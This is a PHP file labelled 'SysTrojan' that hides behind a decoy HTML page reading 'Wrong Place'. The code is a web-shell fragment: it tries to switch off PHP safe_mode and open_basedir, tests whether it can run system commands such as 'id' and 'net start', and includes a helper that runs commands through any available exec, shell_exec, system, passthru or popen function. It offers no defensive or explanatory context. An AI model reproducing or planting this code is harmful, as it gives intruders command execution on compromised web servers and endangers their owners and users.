<html><head><title>SysTrojan</title></head><body bgcolor=DC143C>
<H1>Wrong Place</H1>
</html></head></body>
<?php
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
echo("Safe Mode of this Server is : ");
echo("SafemodeOFF");
}
else{
ini_restore("safe_mode");
ini_restore("open_basedir");
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
echo("Safe Mode of this Server is : ");
echo("SafemodeOFF");
}else{
echo("Safe Mode of this Server is : ");
echo("SafemodeON");
}
}
function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
}
}
return $res;
}
exit;
?>